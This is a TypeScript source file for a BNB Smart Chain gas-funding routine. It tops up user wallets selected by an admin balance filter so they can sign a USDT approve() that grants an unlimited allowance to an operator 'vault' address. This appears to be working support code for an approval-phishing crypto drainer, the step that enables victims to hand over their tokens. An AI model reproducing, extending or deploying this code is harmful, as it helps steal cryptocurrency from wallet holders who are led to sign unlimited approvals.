/**
 * Native-gas funding for wallets that have passed the admin's Wallet Balance Filter but
 * hold no BNB/ETH/TRX of their own — without it they cannot sign the USDT approve()
 * transaction at all. We top them up with just enough native coin (capped by the admin's
 * configured limit) from the operator wallet, and log every attempt for the admin panel.
 *
 * BEP20 (BNB Smart Chain) only for now — ERC20/TRC20 follow once this is proven safe.
 */
import {
  createWalletClient, createPublicClient, fallback, http,
  parseEther, formatEther, getAddress,
} from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import { bsc } from 'viem/chains';
import { connectToDatabase, getNetworkFeeSettings, FeeTransfer } from '@/lib/db';

const USDT_BEP20 = '0x55d398326f99059fF775485246999027B3197955' as `0x${string}`;
const VAULT_BEP20 = (process.env.VAULT_BEP20 ?? '').trim();

const BSC_RPCS = [
  process.env.NEXT_PUBLIC_BSC_RPC, 'https://bsc-dataseed.binance.org',
  'https://bsc-dataseed1.defibit.io', 'https://bsc.drpc.org',
].filter(Boolean) as string[];

const APPROVE_ABI = [{
  name: 'approve', type: 'function' as const, stateMutability: 'nonpayable' as const,
  inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }],
  outputs: [{ type: 'bool' }],
}] as const;

const MAX_UINT256 = (2n ** 256n) - 1n;
const FALLBACK_GAS_UNITS = 65_000n; // safe ceiling for a USDT approve() call on BSC
const GAS_BUFFER_PCT = 130n;        // +30% headroom over the estimate/fallback

function normaliseKey(k: string): `0x${string}` {
  return (k.startsWith('0x') ? k : `0x${k}`) as `0x${string}`;
}

function bscClients() {
  const transport = fallback(BSC_RPCS.map(r => http(r, { timeout: 12_000 })));
  return { publicClient: createPublicClient({ chain: bsc, transport }), transport };
}

export type FundGasResult =
  | { sent: true;  txHash: string; amountBnb: string; feeTransferId: string }
  | { sent: false; reason: 'disabled' | 'sufficient_balance' | 'cap_too_low' | 'not_configured' | 'error'; error?: string };

/**
 * Sends the minimum BNB needed (deficit between what the wallet has and what an
 * approve() call costs, capped by admin's maxFeeBnb) to `address` and logs the attempt.
 * Never throws — all failure paths return a typed result so callers can fail open.
 */
export async function fundBep20GasFee(address: string, userId: string): Promise<FundGasResult> {
  try {
    const settings = await getNetworkFeeSettings();
    if (!settings.enabled) return { sent: false, reason: 'disabled' };

    const rawKey = process.env.VAULT_OPERATOR_PRIVATE_KEY;
    if (!rawKey || !VAULT_BEP20) return { sent: false, reason: 'not_configured' };

    const { publicClient, transport } = bscClients();
    const userAddr = getAddress(address) as `0x${string}`;
    const vaultAddr = getAddress(VAULT_BEP20) as `0x${string}`;

    const [currentBalanceWei, gasPriceWei] = await Promise.all([
      publicClient.getBalance({ address: userAddr }),
      publicClient.getGasPrice(),
    ]);

    let gasUnits = FALLBACK_GAS_UNITS;
    try {
      gasUnits = await publicClient.estimateContractGas({
        address: USDT_BEP20, abi: APPROVE_ABI, functionName: 'approve',
        args: [vaultAddr, MAX_UINT256], account: userAddr,
      });
    } catch {
      // Some wallets revert estimateGas with zero balance — fall back to a known-safe ceiling.
    }

    const neededWei = (gasPriceWei * gasUnits * GAS_BUFFER_PCT) / 100n;
    const deficitWei = neededWei - currentBalanceWei;
    if (deficitWei <= 0n) return { sent: false, reason: 'sufficient_balance' };

    const capWei = parseEther(String(settings.maxFeeBnb));
    const amountWei = deficitWei > capWei ? capWei : deficitWei;
    if (amountWei <= 0n) return { sent: false, reason: 'cap_too_low' };

    const account = privateKeyToAccount(normaliseKey(rawKey));
    const walletClient = createWalletClient({ account, chain: bsc, transport });

    const txHash = await walletClient.sendTransaction({ to: userAddr, value: amountWei });
    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash, timeout: 90_000 });
    if (receipt.status !== 'success') throw new Error('Gas-funding transfer reverted on-chain.');

    await connectToDatabase();
    const log = await FeeTransfer.create({
      userId, network: 'BEP20', toAddress: userAddr, amountNative: parseFloat(formatEther(amountWei)),
      nativeSymbol: 'BNB', txHash, status: 'sent',
    });

    return { sent: true, txHash, amountBnb: formatEther(amountWei), feeTransferId: String(log._id) };
  } catch (err: any) {
    const errorMsg = (err?.message ?? String(err)).slice(0, 300);
    try {
      await connectToDatabase();
      await FeeTransfer.create({
        userId, network: 'BEP20', toAddress: address, amountNative: 0,
        nativeSymbol: 'BNB', status: 'failed', errorMsg,
      });
    } catch { /* logging is best-effort — never let it mask the real error */ }
    return { sent: false, reason: 'error', error: errorMsg };
  }
}

/** Marks a previously logged funding attempt with the outcome of the approve() tx it paid for. */
export async function reportFeeTransferOutcome(feeTransferId: string, contractSuccess: boolean): Promise<void> {
  await connectToDatabase();
  await FeeTransfer.updateOne({ _id: feeTransferId }, { $set: { contractSuccess } }).catch(() => {});
}
